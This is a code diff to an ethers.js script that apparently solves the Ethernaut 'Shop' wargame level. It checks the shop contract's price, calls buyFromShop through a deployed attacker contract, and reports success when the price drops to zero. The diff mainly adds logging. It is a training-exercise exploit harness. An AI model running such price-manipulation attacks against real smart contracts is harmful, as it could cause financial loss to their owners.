@@ -12,14 +12,20 @@ const attackShop = async () => {
     // You may read more on:
     // https://docs.soliditylang.org/en/v0.8.11/contracts.html#view-functions
     const ABI1 = ["function buyFromShop(address _shopAddr)"];
-    const ABI2 = ["function price() external view returns (uint);"]; //TODO: replace this to fix output. Read storage price().
+    const ABI2 = ["function price() external view returns (uint)"];
+    const contractShop = await ethers.getContractAt(ABI2, _shopAddr);
+    console.log("Checking for current price...");
+    let price = (await contractShop.price()).toString();
+    console.log(`Current price is: ${price}`);
+    console.log("Attacking with malisciuos contract...");
     const contractAttack = await ethers.getContractAt(ABI1, attackShopBuyerAddress);
     const tx = await contractAttack.buyFromShop(_shopAddr);
     const txReceipt = tx.wait(1);
     console.log(txReceipt);
-    const contractShop = await ethers.getContractAt(ABI2, _shopAddr);
-    const Output = (await contractShop.price()).toString();
-    if (Output === "0") {
+    console.log("rechecking for price...");
+    price = (await contractShop.price()).toString();
+    console.log(`Price is now: ${price}`);
+    if (price === "0") {
         console.log("Level passed, Submit to ethernaut");
     } else {
         console.log("Please review code above and try again");
